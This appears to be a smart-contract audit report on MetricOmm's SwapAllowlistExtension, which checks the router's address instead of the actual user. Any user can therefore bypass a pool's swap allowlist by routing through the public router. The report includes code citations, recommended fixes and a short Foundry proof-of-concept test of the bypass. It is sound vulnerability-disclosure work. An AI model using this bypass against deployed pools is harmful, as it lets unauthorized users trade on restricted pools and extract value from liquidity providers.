### Title
`SwapAllowlistExtension` Checks Router Address Instead of Actual User, Allowing Any User to Bypass the Swap Allowlist via `MetricOmmSimpleRouter` — (`metric-periphery/contracts/extensions/SwapAllowlistExtension.sol`)

---

### Summary

`SwapAllowlistExtension.beforeSwap()` gates swaps by checking the `sender` argument, which is `msg.sender` of the pool's `swap()` call. When a swap is routed through `MetricOmmSimpleRouter`, `msg.sender` at the pool is the router contract, not the originating user. If the pool admin allowlists the router (required for any allowlisted user to use the router), every unpermissioned user can bypass the per-user allowlist by routing through the same public router.

---

### Finding Description

`SwapAllowlistExtension.beforeSwap()` receives `sender` from the pool and checks it against the per-pool allowlist:

```solidity
// SwapAllowlistExtension.sol L31-41
function beforeSwap(address sender, address, bool, int128, uint128, uint256, uint128, uint128, bytes calldata)
    external view override returns (bytes4)
{
    if (!allowAllSwappers[msg.sender] && !allowedSwapper[msg.sender][sender]) {
        revert IMetricOmmPoolActions.NotAllowedToSwap();
    }
    return IMetricOmmExtensions.beforeSwap.selector;
}
```

The `sender` value originates in `MetricOmmPool.swap()`, which passes `msg.sender` directly:

```solidity
// MetricOmmPool.sol L230-240
_beforeSwap(
    msg.sender,   // ← whoever called pool.swap()
    recipient,
    ...
);
```

When a user calls `MetricOmmSimpleRouter.exactInputSingle()`, the router calls `pool.swap()` on the user's behalf:

```solidity
// MetricOmmSimpleRouter.sol L72-80
(int128 amount0Delta, int128 amount1Delta) = IMetricOmmPoolActions(params.pool)
    .swap(
        params.recipient,
        params.zeroForOne,
        MetricOmmSwapInputs.asAmountSpecifiedIn(params.amountIn),
        priceLimitX64,
        "",
        params.extensionData
    );
```

At this point `msg.sender` inside `pool.swap()` is the **router address**, not the originating user. The extension therefore checks `allowedSwapper[pool][router]`, not `allowedSwapper[pool][user]`.

The pool admin faces an inescapable dilemma:

| Admin choice | Effect |
|---|---|
| Do **not** allowlist the router | Allowlisted users cannot use the router at all |
| **Allowlist the router** | Every non-allowlisted user can bypass the gate via the router |

There is no path that simultaneously allows allowlisted users to use the router and blocks non-allowlisted users from doing the same.

---

### Impact Explanation

A pool deploying `SwapAllowlistExtension` is a curated, permissioned pool — typical use cases include KYC-gated institutional pools, pools restricted to protocol-owned addresses, or pools with regulatory constraints. Once the router is allowlisted (the only way to let legitimate users trade through the standard periphery), the allowlist is completely ineffective: any address can call `MetricOmmSimpleRouter.exactInputSingle/exactInput/exactOutputSingle/exactOutput` and trade on the pool as if they were allowlisted.

Concrete consequences:
- Unauthorized users extract value from LP positions in a pool that was supposed to be restricted.
- Regulatory/compliance guarantees of the pool operator are silently broken.
- The pool admin has no on-chain mechanism to distinguish a legitimate allowlisted router call from an unauthorized one.

This is a **direct loss of LP assets and broken core pool functionality** (the allowlist invariant is the core policy of the pool).

---

### Likelihood Explanation

- The `MetricOmmSimpleRouter` is a public, permissionless contract — any EOA or contract can call it.
- The bypass requires zero privileged access: the attacker only needs to know the pool address and call the router.
- The pool admin is forced to allowlist the router to serve legitimate users, making the bypass condition the default operational state.
- No existing guard in the router or the pool prevents the substitution of the router address for the user address.

Likelihood: **High**.

---

### Recommendation

The extension must gate on the **economically relevant actor** — the address that initiated the trade and will pay for it — not the intermediate dispatcher. Two complementary fixes:

1. **Pass the original initiator through the router.** The router should forward `msg.sender` as an explicit `initiator` field inside `extensionData`. The `SwapAllowlistExtension` should decode and check that field instead of (or in addition to) `sender`.

2. **Check `recipient` as a fallback identity.** For single-hop swaps where the recipient equals the initiator, checking `recipient` instead of `sender` would correctly identify the user. This is not sufficient for multi-hop flows where the recipient of intermediate hops is the router itself.

3. **Alternatively, gate at the router level.** The router could maintain its own allowlist and revert before calling the pool if the caller is not permitted. This keeps the pool-level extension simple but requires the router to be trusted and upgraded when the allowlist changes.

The cleanest fix is option 1: add an `initiator` field to `extensionData` that the router populates with `msg.sender`, and update `SwapAllowlistExtension.beforeSwap()` to decode and check it.

---

### Proof of Concept

```solidity
// Setup: pool with SwapAllowlistExtension; only `allowedUser` is allowlisted.
// Pool admin must also allowlist the router so allowedUser can trade via router.
swapExtension.setAllowedToSwap(address(pool), address(router), true);
swapExtension.setAllowedToSwap(address(pool), allowedUser, true);
// allowedUser can now trade directly or via router.

// Attack: bannedUser (not allowlisted) routes through the public router.
vm.startPrank(bannedUser);
token1.approve(address(router), type(uint256).max);

// This call succeeds because the extension sees sender=router (allowlisted),
// not sender=bannedUser (not allowlisted).
router.exactInputSingle(
    IMetricOmmSimpleRouter.ExactInputSingleParams({
        pool:            address(pool),
        recipient:       bannedUser,
        tokenIn:         address(token1),
        zeroForOne:      false,
        amountIn:        1000,
        amountOutMinimum: 0,
        priceLimitX64:   type(uint128).max,
        deadline:        block.timestamp + 1,
        extensionData:   ""
    })
);
// bannedUser successfully swapped on a pool that was supposed to block them.
vm.stopPrank();
```

**Relevant code locations:** [1](#0-0) [2](#0-1) [3](#0-2) [4](#0-3)

### Citations

**File:** metric-periphery/contracts/extensions/SwapAllowlistExtension.sol (L31-41)
```text
  function beforeSwap(address sender, address, bool, int128, uint128, uint256, uint128, uint128, bytes calldata)
    external
    view
    override
    returns (bytes4)
  {
    if (!allowAllSwappers[msg.sender] && !allowedSwapper[msg.sender][sender]) {
      revert IMetricOmmPoolActions.NotAllowedToSwap();
    }
    return IMetricOmmExtensions.beforeSwap.selector;
  }
```

**File:** metric-core/contracts/MetricOmmPool.sol (L230-240)
```text
    _beforeSwap(
      msg.sender,
      recipient,
      zeroForOne,
      amountSpecified,
      priceLimitX64,
      packedSlot0Initial,
      bidPriceX64,
      askPriceX64,
      extensionData
    );
```

**File:** metric-periphery/contracts/MetricOmmSimpleRouter.sol (L71-86)
```text
    _setNextCallbackContext(params.pool, CALLBACK_MODE_JUST_PAY, msg.sender, params.tokenIn);
    (int128 amount0Delta, int128 amount1Delta) = IMetricOmmPoolActions(params.pool)
      .swap(
        params.recipient,
        params.zeroForOne,
        MetricOmmSwapInputs.asAmountSpecifiedIn(params.amountIn),
        priceLimitX64,
        "",
        params.extensionData
      );
    int128 out = MetricOmmSwapResults.extractAmountOut(params.zeroForOne, amount0Delta, amount1Delta);
    amountOut = MetricOmmSwapInputs.int128ToUint128(out);
    if (amountOut < params.amountOutMinimum) revert InsufficientOutput(amountOut, params.amountOutMinimum);

    _clearExpectedCallbackPool();
  }
```

**File:** metric-core/contracts/ExtensionCalling.sol (L149-177)
```text
  function _beforeSwap(
    address sender,
    address recipient,
    bool zeroForOne,
    int128 amountSpecified,
    uint128 priceLimitX64,
    uint256 packedSlot0Initial,
    uint128 bidPriceX64,
    uint128 askPriceX64,
    bytes calldata extensionData
  ) internal {
    _callExtensionsInOrder(
      BEFORE_SWAP_ORDER,
      abi.encodeCall(
        IMetricOmmExtensions.beforeSwap,
        (
          sender,
          recipient,
          zeroForOne,
          amountSpecified,
          priceLimitX64,
          packedSlot0Initial,
          bidPriceX64,
          askPriceX64,
          extensionData
        )
      )
    );
  }
```
